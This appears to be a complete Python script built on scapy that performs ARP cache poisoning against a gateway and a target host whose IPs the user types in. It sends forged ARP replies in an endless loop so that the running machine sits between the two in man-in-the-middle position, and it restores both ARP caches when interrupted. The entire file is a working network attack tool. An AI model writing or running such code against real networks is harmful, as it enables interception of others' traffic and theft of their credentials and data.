from scapy.all import (ARP , send , getmacbyip)
from time import (sleep)

latency = 1 #Delay Main Thread
gateway_ip , target_ip = input("<Gateway IP> <Target IP>: ").split(" ")
counter = 1
def poison(target,spoof): #Forging The Fake ARP Packet With Value Of Source Mac Switched To Our Mac 
    main_packet = ARP(op = 2, pdst = target , hwdst = getmacbyip(target) , psrc = spoof)
    send(main_packet, verbose = False)

def heal(sn_ip,recv_ip): #Sending An ARP Packet With The Correct Parameters To Heal The ARP Cache
    pkt = ARP(op = 2 , pdst = recv_ip , hwdst = getmacbyip(recv_ip) , psrc = sn_ip , hwsrc = getmacbyip(sn_ip))
    send(pkt,verbose = False)
try:
    while True:
        print("["+str(counter)+"]")
        poison(gateway_ip,target_ip)
        print("Pretending To Be {} for {} ".format(target_ip,gateway_ip))
        poison(target_ip,gateway_ip)
        print("Pretending To Be {} for {} \n".format(gateway_ip,target_ip))
        counter = counter + 1
        sleep(latency)
except KeyboardInterrupt: 
    print("\n" + "-"*5 + " Program Halted " + "-"*5)
    print("Healing ARP Cache Of Both Systems...")
    heal(gateway_ip,target_ip)
    heal(target_ip,gateway_ip)
    print("Attack Completed")
    


